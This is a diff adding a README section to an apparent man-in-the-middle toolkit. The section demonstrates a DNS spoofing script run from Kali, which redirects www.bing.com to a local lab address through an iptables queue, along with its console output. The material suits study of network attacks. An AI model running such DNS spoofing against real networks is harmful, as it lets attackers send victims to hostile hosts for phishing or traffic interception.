@@ -47,3 +47,20 @@ In that case the interceptor has option of modify the packet before accept or dr
     optparse
 
  
+## DNS Spoofing Attack under MitM environment
+
+    root@kali:~/PycharmProjects/mitm_process.py# python dns_spoofing.py -o "www.bing.com" -d "10.0.2.15"
+    init attack ....DNS 
+    Enable Iptables queue for input target packets ... on queue number 0
+    [+] spoofing target ---> www.bing.com. to 10.0.2.15
+    [+] spoofing target ---> www.bing.com. to 10.0.2.15
+    [+] spoofing target ---> www.bing.com. to 10.0.2.15
+    [+] spoofing target ---> www.bing.com. to 10.0.2.15
+    [+] spoofing target ---> www.bing.com. to 10.0.2.15
+    ^C[*] CRTL +C Detecting ... Flush queue for Iptables on local machine 
+    [*] End program 
+   
+![spoof-1]()
+
+![spoof-2]()
+
